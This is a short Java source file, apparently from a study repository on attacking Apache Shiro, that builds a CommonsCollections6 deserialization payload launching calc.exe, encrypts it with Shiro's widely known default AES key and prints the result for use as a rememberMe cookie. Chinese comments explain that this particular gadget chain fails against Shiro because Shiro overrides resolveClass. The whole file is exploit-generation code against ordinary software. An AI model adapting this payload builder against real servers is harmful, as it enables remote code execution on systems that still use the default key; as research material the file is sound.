package com.govuln.shiroattack;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

/**
 * 不可以打shiro
 */
public class Client0 {


    // 用cc6的这个payload打shiro是不可以的，原因是shiro重写了 resolveClass 的实现,不能加载transformer数组
    // p牛给出的最终结论是如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。
    public static void main(String []args) throws Exception {
        byte[] payloads = new CommonsCollections6().getPayload("calc.exe");
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
